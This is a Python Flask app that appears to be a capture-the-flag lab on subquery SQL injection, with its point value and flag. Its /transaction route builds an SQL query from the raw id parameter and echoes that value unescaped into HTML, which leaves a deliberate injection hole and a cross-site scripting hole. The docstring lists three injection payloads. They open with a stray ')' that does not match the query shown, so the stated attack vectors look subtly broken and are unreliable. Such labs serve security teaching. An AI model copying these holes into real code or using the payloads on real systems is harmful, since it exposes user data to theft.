"""
SQL Injection Lab 12: Subquery SQL Injection
Difficulty: 3 (Advanced)
Points: 100

Description:
SQL injection using subqueries for data extraction.
"""

from flask import Flask, request
import sqlite3

app = Flask(__name__)

DB_PATH = '/tmp/sqli_12.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS transactions 
                      (id INTEGER PRIMARY KEY, amount REAL, user_id INTEGER)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                      (id INTEGER PRIMARY KEY, username TEXT, balance REAL)''')
    cursor.execute("INSERT OR IGNORE INTO users VALUES (1, 'admin', 10000)")
    cursor.execute("INSERT OR IGNORE INTO transactions VALUES (1, 500, 1)")
    conn.commit()
    conn.close()

init_db()

@app.route('/transaction')
def transaction():
    """
    VULNERABLE: Subquery-based SQL injection
    
    Attack Vector:
    /transaction?id=1) UNION SELECT user_id, (SELECT balance FROM users), 0 FROM transactions --
    /transaction?id=1) AND (SELECT COUNT(*) FROM users WHERE id=1)>0 --
    /transaction?id=1) OR id IN (SELECT user_id FROM users WHERE balance > 5000) --
    
    Flag: FLAG{sql_injection_subquery_012}
    """
    trans_id = request.args.get('id', '1')
    result = None
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # VULNERABLE: Subquery injection
        query = f"SELECT * FROM transactions WHERE id={trans_id}"
        cursor.execute(query)
        trans = cursor.fetchone()
        
        if trans:
            result = f"<p>Transaction ID: {trans[0]}</p><p>Amount: ${trans[1]}</p><p>User: {trans[2]}</p>"
        else:
            result = "Transaction not found"
        
        conn.close()
    except Exception as e:
        result = f"Error: {str(e)}"
    
    return f"""
    <html>
    <body>
        <h1>Transaction Details</h1>
        <form method="GET">
            <input type="text" name="id" placeholder="Transaction ID" value="{trans_id}">
            <button>View</button>
        </form>
        {result if result else ""}
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5012, debug=False)
